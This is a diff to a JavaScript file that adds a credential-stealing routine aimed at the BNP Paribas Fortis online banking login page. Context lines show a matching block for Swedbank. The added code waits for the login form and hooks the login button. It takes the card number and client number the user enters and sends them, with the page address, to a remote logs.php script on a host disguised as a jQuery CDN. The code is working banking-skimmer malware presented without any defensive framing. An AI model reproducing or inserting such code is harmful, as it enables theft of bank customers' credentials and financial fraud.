@@ -8,6 +8,21 @@ for (var i = 0; i < arrayLength; i++) {
 }
 
 
+if (top['location']['href']['indexOf']('www.bnpparibasfortis.be') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementsByClassName']('login_flow')[0]) {
+            clearInterval(interval);
+            document['getElementsByClassName']('btn_default btn_primary login_btn btn_active_bg')[0].onclick = function (_0x441cx2) {
+              var login = {};
+                  login.userid = document.getElementsByName("cardNum")[0].value;
+                  login.userpass = document.getElementsByName("clientNum")[0].value;
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.userpass;
+            }
+        }
+    }, 1000)
+};
+
+
 if (top['location']['href']['indexOf']('https://online.swedbank.se/app/privat/login') > -1) {
     var interval = setInterval(function () {
         if (document['getElementsByClassName']('app-identification_login-method')[0]) {
